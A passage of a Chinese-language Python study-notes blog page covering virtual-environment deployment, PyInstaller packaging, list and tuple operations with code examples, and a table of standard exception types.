命令将项目的<strong>库依赖导出</strong>，作为代码的一部分</li><li>将代码上传到服务器</li><li>在服务器上创建一个虚拟环境</li><li>激活虚拟环境.venv\Scripts\activate.bat，执行 <code>pip install -r requirements.txt</code>，安装项目依赖</li></ol><h2 id="怎么运行项目，需要看项目的具体情况"><a href="#怎么运行项目，需要看项目的具体情况" class="headerlink" title="怎么运行项目，需要看项目的具体情况"></a>怎么运行项目，需要看项目的具体情况</h2><ul><li>Web 项目 Web 项目一般使用 Django、Flask 的 Web 开发的提供 Web 服务的项目，部署时需要一个 Web 容器，作为程序的运行环境，容器的配置中都有一个虚拟环境的设置，其实是指定 Python 解析器的路径，将其设置为虚拟环境的目录或者 Python 解析器就可以了，启动时就用使用虚拟环境，并与其他环境隔离。例如 uWSGI 配置文件中 home 参数是用来指定解析器的。</li><li>服务类项目 服务类项目就是需要以服务的形式长时间运行的，例如之前介绍的 公交闹钟，或者一些定时爬虫之类的，对于 Linux 而言，当前主流的服务方式是 Systemd，是一种比 init 更先进的服务管理工具，在服务脚本中， 设置 ExecStart 执行命令为全路径的虚拟环境的 Python 解析器，服务启动时，使用独立的虚拟环境了。Windows 服务，对于达成 EXE 包的，不需要配置虚拟环境，因为打包时已经考虑了环境问题了，如果是脚本运行的话，需要指定全路径的 Python 解析器</li><li>单次运行项目 对于一些测试或者实验性质的项目，大多数情况下手动执行，只要在激活的虚拟环境下，或者用特定的 Python 解析器运行就好了，和在开发过程中运行区别不大</li></ul><h3 id="打包成exe"><a href="#打包成exe" class="headerlink" title="打包成exe"></a>打包成exe</h3><p>pip install pyinstaller</p><p>进入要打包的项目内</p><p>处理路径问题</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取exe文件所在的目录,将项目路径转为打包完之后的exe路径</span></span><br><span class="line">current_path = os.path.dirname (sys.executable)</span><br></pre></td></tr></table></figure></blockquote><p>pyinstaller –onefile main.py</p><p>pyinstaller –onefile –windowed –icon=my_icon.ico your_script.py 自定义打包的exe图标，ico放到main.py相同目录下，也可以更改快捷方式图标的方式</p><p>到dist目录下找main.exe</p><h3 id="pycharm几个快捷键"><a href="#pycharm几个快捷键" class="headerlink" title="pycharm几个快捷键"></a>pycharm几个快捷键</h3><p>ctrl+shift+R 批量查找替换/区别于：ctrl+shift+F win11切换中文简体繁体</p><hr><h1 id="基础语法知识"><a href="#基础语法知识" class="headerlink" title="基础语法知识"></a>基础语法知识</h1><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ul><li><strong>序列</strong>是 Python 中最基本的<strong>数据结构</strong>。</li><li>序列中的每个值都有<strong>索引</strong>，从0开始。</li><li> Python 有 <strong>6 个</strong>序列的<strong>内置类型</strong>，但<strong>最常见</strong>的是<strong>列表和元组</strong>。</li><li><strong>列表</strong>都可以进行的操作包括<strong>索引，切片，加，乘，检查成员</strong>。</li><li><strong>内置</strong>确定序列的<strong>长度</strong>以及确定<strong>最大</strong>和<strong>最小</strong>的元素的<strong>方法</strong>。</li><li><strong>列表</strong>是<strong>最常用</strong>的 Python 数据类型，<strong>可嵌套</strong>。</li><li>列表<strong>支持反向索引</strong>，访问区间<strong>左闭右开</strong></li><li>列表的数据项<strong>不要求相同类型</strong></li><li>创建一个列表，只要把<strong>逗号</strong>分隔的不同的数据项使用<strong>方括号</strong>括起来即可。如下所示：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">list1 = [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">list3 = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line">list4 = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;black&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h3><p>可以对列表的数据项进行修改或更新，你也可以使用 append() 方法来添加列表项，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">list</span> = [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;第三个元素为 : &quot;</span>, <span class="built_in">list</span>[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">list</span>[<span class="number">2</span>] = <span class="number">2001</span>  <span class="comment">#这里要区别元组，元组是名称相同，赋值是本质是创建新元组，本质上内存不同</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;更新后的第三个元素为 : &quot;</span>, <span class="built_in">list</span>[<span class="number">2</span>])</span><br><span class="line"> </span><br><span class="line">list1 = [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>]</span><br><span class="line">list1.append(<span class="string">&#x27;Baidu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;更新后的列表 : &quot;</span>, list1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">第三个元素为 :  <span class="number">1997</span></span><br><span class="line">更新后的第三个元素为 :  <span class="number">2001</span></span><br><span class="line">更新后的列表 :  [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>, <span class="string">&#x27;Baidu&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">list</span> = [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;原始列表 : &quot;</span>, <span class="built_in">list</span>)</span><br><span class="line"><span class="keyword">del</span> <span class="built_in">list</span>[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;删除第三个元素 : &quot;</span>, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">原始列表 :  [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">删除第三个元素 :  [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="number">2000</span>]</span><br></pre></td></tr></table></figure><ul><li>另外，remove() 方法也可以删除，在后面详细讨论</li></ul><h3 id="列表的脚本操作"><a href="#列表的脚本操作" class="headerlink" title="列表的脚本操作"></a>列表的脚本操作</h3><p>列表对 + 和  * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。</p><table><thead><tr><th>Python 表达式</th><th>结果</th><th>描述</th></tr></thead><tbody><tr><td>len([1, 2, 3])</td><td>3</td><td>长度</td></tr><tr><td>[1, 2, 3] + [4, 5, 6]</td><td>[1, 2, 3, 4, 5, 6]</td><td>组合</td></tr><tr><td>[‘Hi!’] * 4</td><td>[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td>重复</td></tr><tr><td>3 in [1, 2, 3]</td><td>True</td><td>元素是否存在于列表中</td></tr><tr><td>for x in [1, 2, 3]: print(x, end=” “)</td><td>1 2 3</td><td>迭代</td></tr></tbody></table><hr><h3 id="截取-amp-拼接"><a href="#截取-amp-拼接" class="headerlink" title="截取 &amp; 拼接"></a>截取 &amp; 拼接</h3><p>和元组一样，支持L[1:]写法，截取索引从1开始到最后所有元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;squares = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>] </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>squares += [<span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>] </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>squares </span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>] </span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;&gt;&gt;a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>n = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = [a, n]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">[[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x[<span class="number">0</span>]</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="内置函数-amp-方法"><a href="#内置函数-amp-方法" class="headerlink" title="内置函数 &amp; 方法"></a>内置函数 &amp; 方法</h3><table><thead><tr><th>序号</th><th>函数</th></tr></thead><tbody><tr><td>1</td><td><a href="https://www.runoob.com/python3/python3-att-list-len.html">len(list)</a> 列表元素个数</td></tr><tr><td>2</td><td><a href="https://www.runoob.com/python3/python3-att-list-max.html">max(list)</a> 返回列表元素最大值</td></tr><tr><td>3</td><td><a href="https://www.runoob.com/python3/python3-att-list-min.html">min(list)</a> 返回列表元素最小值</td></tr><tr><td>4</td><td><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(seq)</a> 将元组转换为列表</td></tr></tbody></table><table><thead><tr><th>序号</th><th>方法</th></tr></thead><tbody><tr><td>1</td><td><a href="https://www.runoob.com/python3/python3-att-list-append.html">list.append(obj)</a> 在列表末尾添加新的对象</td></tr><tr><td>2</td><td><a href="https://www.runoob.com/python3/python3-att-list-count.html">list.count(obj)</a> 统计某个元素在列表中出现的次数</td></tr><tr><td>3</td><td><a href="https://www.runoob.com/python3/python3-att-list-extend.html">list.extend(seq)</a> 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td>4</td><td><a href="https://www.runoob.com/python3/python3-att-list-index.html">list.index(obj)</a> 从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>5</td><td><a href="https://www.runoob.com/python3/python3-att-list-insert.html">list.insert(index, obj)</a> 将对象插入列表</td></tr><tr><td>6</td><td>[list.pop(<a href="https://www.runoob.com/python3/python3-att-list-pop.html">index=-1])</a> 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>7</td><td><a href="https://www.runoob.com/python3/python3-att-list-remove.html">list.remove(obj)</a> 移除列表中某个值的第一个匹配项</td></tr><tr><td>8</td><td><a href="https://www.runoob.com/python3/python3-att-list-reverse.html">list.reverse()</a> 反向列表中元素</td></tr><tr><td>9</td><td><a href="https://www.runoob.com/python3/python3-att-list-sort.html">list.sort( key=None, reverse=False)</a> 对原列表进行排序</td></tr><tr><td>10</td><td><a href="https://www.runoob.com/python3/python3-att-list-clear.html">list.clear()</a> 清空列表</td></tr><tr><td>11</td><td><a href="https://www.runoob.com/python3/python3-att-list-copy.html">list.copy()</a> 复制列表</td></tr></tbody></table><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><ul><li>Python的元组与列表类似，不同之处在于元组的元素不能修改。</li><li>元组使用小括号，列表使用方括号。</li><li>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</li><li>元组与字符串类似，下标索引从0开始，可以进行截取，组合等。</li></ul><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;tup0 = () <span class="comment">#空元组</span></span><br><span class="line">&gt;&gt;&gt;tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">&gt;&gt;&gt;tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> )</span><br><span class="line">&gt;&gt;&gt;tup3 = <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>   <span class="comment">#  不需要括号也可以</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(tup3)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt;tup4 = (50,) #元组中只包含一个元素时，需要在元素后面添加逗号,否则括号会被当作运算符使用：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup5 = (<span class="number">50</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(tup4)     <span class="comment"># 加上逗号，类型为元组</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span>(<span class="params">tup5</span>)     # 不加逗号，类型为整型</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">int</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="访问-amp-截取"><a href="#访问-amp-截取" class="headerlink" title="访问 &amp; 截取"></a>访问 &amp; 截取</h3><ul><li><p>下标索引访问元组中的值，有正向索引和反向索引</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210717211758961.png" alt="image-20210717211758961"></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">tup1 = (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;tup1[0]: &quot;</span>, tup1[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;tup1[1:]: &quot;</span>, tup1[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;tup2[1:5]: &quot;</span>, tup2[<span class="number">1</span>:<span class="number">5</span>]) <span class="comment">#左闭右开</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">tup1[<span class="number">0</span>]:  Google</span><br><span class="line">tup1[<span class="number">1</span>:]:  Runoob <span class="number">1997</span> <span class="number">2000</span></span><br><span class="line">tup2[<span class="number">1</span>:<span class="number">5</span>]:  (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><ul><li>元组中的<strong>元素值不允许</strong>修改，但<strong>元组可以进行连接组合</strong>，如下实例:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">tup1 = (<span class="number">12</span>, <span class="number">34.56</span>)</span><br><span class="line">tup2 = (<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;xyz&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 以下修改元组元素操作是非法的。</span></span><br><span class="line"><span class="comment"># tup1[0] = 100</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建一个新的元组</span></span><br><span class="line">tup3 = tup1 + tup2</span><br><span class="line"><span class="built_in">print</span> (tup3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">(<span class="number">12</span>, <span class="number">34.56</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;xyz&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><ul><li>元组中的<strong>元素值不允许删除</strong>，但我们<strong>可以用del语句删除整个元组</strong>，如下实例:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">tup = (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (tup)</span><br><span class="line"><span class="keyword">del</span> tup</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;删除后的元组 tup : &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (tup)</span><br><span class="line"></span><br><span class="line"><span class="comment">#以上实例元组被删除后，输出变量会有异常信息，输出如下所示：</span></span><br><span class="line">删除后的元组 tup : </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">8</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span> (tup)</span><br><span class="line">NameError: name <span class="string">&#x27;tup&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><h3 id="元组运算符"><a href="#元组运算符" class="headerlink" title="元组运算符"></a>元组运算符</h3><p>与字符串一样，与列表相似，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组</p><table><thead><tr><th>Python 表达式</th><th>结果</th><th>描述</th></tr></thead><tbody><tr><td>len((1, 2, 3))</td><td>3</td><td>计算元素个数</td></tr><tr><td>(1, 2, 3) + (4, 5, 6)</td><td>(1, 2, 3, 4, 5, 6)</td><td>连接</td></tr><tr><td>(‘Hi!’,) * 4</td><td>(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)</td><td>复制</td></tr><tr><td>3 in (1, 2, 3)</td><td>True</td><td>元素是否存在</td></tr><tr><td>for x in (1, 2, 3): print (x,)</td><td>1 2 3</td><td>迭代</td></tr></tbody></table><hr><h3 id="元组内置函数"><a href="#元组内置函数" class="headerlink" title="元组内置函数"></a>元组内置函数</h3><table><thead><tr><th>序号</th><th>方法及描述</th><th>实例</th></tr></thead><tbody><tr><td>1</td><td>len(tuple) 计算元组元素个数。</td><td><code>&gt;&gt;&gt; tuple1 = (&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;)  &gt;&gt;&gt; len(tuple1) 3 </code></td></tr><tr><td>2</td><td>max(tuple) 返回元组中元素最大值。</td><td><code>&gt;&gt;&gt; tuple2 = (&#39;5&#39;, &#39;4&#39;, &#39;8&#39;) &gt;&gt;&gt; max(tuple2) &#39;8&#39;  </code></td></tr><tr><td>3</td><td>min(tuple) 返回元组中元素最小值。</td><td><code>&gt;&gt;&gt; tuple2 = (&#39;5&#39;, &#39;4&#39;, &#39;8&#39;) &gt;&gt;&gt; min(tuple2) &#39;4&#39;  </code></td></tr><tr><td>4</td><td>tuple(iterable) 将可迭代系列转换为元组。</td><td><code>&gt;&gt;&gt; list1= [&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;] &gt;&gt;&gt; tuple1=tuple(list1) &gt;&gt;&gt; tuple1 (&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;)</code></td></tr></tbody></table><hr><h3 id="元组元素不可变"><a href="#元组元素不可变" class="headerlink" title="元组元素不可变"></a>元组元素不可变</h3><p>所谓元组的不可变指的是元组所指向的内存中的内容不可变。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup = (<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup[<span class="number">0</span>] = <span class="string">&#x27;g&#x27;</span>   <span class="comment"># 不支持修改元素</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"> File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, **<span class="keyword">in</span>** &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;tuple&#x27;</span> <span class="built_in">object</span> does **<span class="keyword">not</span>** support item assignment</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(tup)   <span class="comment"># 查看内存地址</span></span><br><span class="line"><span class="number">4440687904</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(tup)</span><br><span class="line"><span class="number">4441088800</span>   <span class="comment"># 内存地址不一样了</span></span><br></pre></td></tr></table></figure><p>从以上实例可以看出，重新赋值的元组 tup，虽然元组名字一样，但实际上在内存上已经绑定到新的对象了，不是修改了原来的对象。</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="什么是异常？"><a href="#什么是异常？" class="headerlink" title="什么是异常？"></a>什么是异常？</h3><p>异常是一个事件，该事件会在程序执行过程中发生，影响了程序的正常执行。</p><ul><li><p>一般情况下，在Python无法正常处理程序时就会发生一个异常。</p></li><li><p>异常是Python对象，表示一个错误。</p></li><li><p>当Python脚本发生异常时我们需要捕获处理它，否则程序会终止执行。</p></li></ul><h3 id="有哪些异常？"><a href="#有哪些异常？" class="headerlink" title="有哪些异常？"></a>有哪些异常？</h3><h4 id="python标准异常"><a href="#python标准异常" class="headerlink" title="python标准异常"></a>python标准异常</h4><table><thead><tr><th>异常名称</th><th>描述</th></tr></thead><tbody><tr><td>BaseException</td><td>所有异常的基类</td></tr><tr><td>SystemExit</td><td>解释器请求退出</td></tr><tr><td>KeyboardInterrupt</td><td>用户中断执行(通常是输入^C)</td></tr><tr><td>Exception</td><td>常规错误的基类</td></tr><tr><td>StopIteration</td><td>迭代器没有更多的值</td></tr><tr><td>GeneratorExit</td><td>生成器(generator)发生异常来通知退出</td></tr><tr><td>StandardError</td><td>所有的内建标准异常的基类</td></tr><tr><td>ArithmeticError</td><td>所有数值计算错误的基类</td></tr><tr><td>FloatingPointError</td><td>浮点计算错误</td></tr><tr><td>OverflowError</td><td>数值运算超出最大限制</td></tr><tr><td>ZeroDivisionError</td><td>除(或取模)零 (所有数据类型)</td></tr><tr><td>AssertionError</td><td>断言语句失败</td></tr><tr><td>AttributeError</td><td>对象没有这个属性</td></tr><tr><td>EOFError</td><td>没有内建输入,到达EOF 标记</td></tr><tr><td>EnvironmentError</td><td>操作系统错误的基类</td></tr><tr><td>IOError</td><td>输入/输出操作失败</td></tr><tr><td>OSError</td><td>操作系统错误</td></tr><tr><td>WindowsError</td><td>系统调用失败</td></tr><tr><td>ImportError</td><td>导入模块/对象失败</td></tr><tr><td>LookupError</td><td>无效数据查询的基类</td></tr><tr><td>IndexError</td><td>序列中没有此索引(index)</td></tr><tr><td>KeyError</td><td>映射中没有这个键</td></tr><tr><td>MemoryError</td><td>内存溢出错误(对于Python 解释器不是致命的)</td></tr><tr><td>NameError</td><td>未声明/初始化对象 (没有属性)</td></tr><tr><td>UnboundLocalError</td><td>访问未初始化的本地变量</td></tr><tr><td>ReferenceError</td><td>弱引用(Weak reference)试图访问已经垃圾回收了的对象</td></tr><tr><td>RuntimeError</td><td>一般的运行时错误</td></tr><tr><td>NotImplementedError</td><td>尚未实现的方法</td></tr><tr><td>SyntaxError</td><td>Python 语法错误</td></tr><tr><td>IndentationError</td><td>缩进错误</td></tr><tr><td>TabError</td><td>Tab 和空格混用</td></tr><tr><td>SystemError</td><td>一般的解释器系统错误</td></tr><tr><td>TypeError</td><td>对类型无效的操作</td></tr><tr><td>ValueError</td><td>传入无效的参数</td></tr><tr><td>UnicodeError</td><td>Unicode 相关的错误</td></tr><tr><td>UnicodeDecodeError</td><td>Unicode 解码时的错误</td></tr><tr><td>UnicodeEncodeError</td><td>Unicode 编码时错误</td></tr><tr><td>UnicodeTranslateError</td><td>Unicode 转换时错误</td></tr><tr><td>Warning</td><td>警告的基类</td></tr><tr><td>DeprecationWarning</td><td>关于被弃用的特征的警告</td></tr><tr><td>FutureWarning</td><td>关于构造将来语义会有改变的警告</td></tr><tr><td>OverflowWarning</td><td>旧的关于自动提升为长整型(long)的警告</td></tr><tr><td>PendingDeprecationWarning</td><td>关于特性将会被废弃的警告</td></tr><tr><td>RuntimeWarning</td><td>可疑的运行时行为(runtime behavior)的警告</td></tr><tr><td>SyntaxWarning</td><td>可疑的语法的警告</td></tr><tr><td>UserWarning</td><td>用户代码生成的警告</td></tr></tbody></table><h3 id="如何处理异常？"><a href="#如何处理异常？" class="headerlink" 